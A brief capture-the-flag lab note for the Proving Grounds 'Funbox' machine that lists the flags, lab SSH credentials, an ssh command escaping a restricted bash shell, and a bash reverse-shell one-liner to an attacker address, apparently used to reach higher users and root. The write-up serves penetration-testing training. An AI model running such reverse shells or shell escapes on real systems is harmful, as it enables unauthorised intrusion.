# Proving Grounds Funbox

> Saikat Karmakar | Sept 26 : 2021

> ip :  192.168.118.77  

---

1. user flag
```
eb875270079e9bebaecff03d1715d2c6
```
2. root flag
```
896e0274161f72e87cb43de10d1c8696
```

funbox.fritz.box

---
***Notes***

- ssh creds
```
joe : 12345
```

- escape rbash
```bash
ssh joe@funbox.fritz.box -t "bash --noprofile" 
```

- rev-shell to get to user funny & also the root user

```bash
bash -i >& /dev/tcp/192.168.49.118/1234 0>&1
```
